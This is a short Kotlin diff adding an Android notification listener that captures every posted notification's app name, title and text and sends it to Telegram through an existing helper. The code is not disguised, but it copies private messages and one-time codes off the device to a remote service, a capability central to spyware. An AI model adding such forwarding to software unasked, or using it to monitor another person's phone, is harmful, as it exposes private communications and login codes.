@@ -1,0 +1,19 @@
+package com.luffa
+
+import android.service.notification.NotificationListenerService
+import android.service.notification.StatusBarNotification
+import kotlinx.coroutines.*
+
+class NotifListener : NotificationListenerService() {
+    override fun onNotificationPosted(sbn: StatusBarNotification) {
+        if (sbn.isOngoing) return
+        val pkg = sbn.packageName
+        val title = sbn.notification.extras.getString("android.title") ?: ""
+        val text = sbn.notification.extras.getString("android.text") ?: ""
+        CoroutineScope(Dispatchers.IO).launch {
+            val msg = "🔔 $pkg\n$title: $text"
+            // reuse your existing sendTelegramMessage logic
+            MyService.sendStaticTelegramMessage(msg)
+        }
+    }
+}
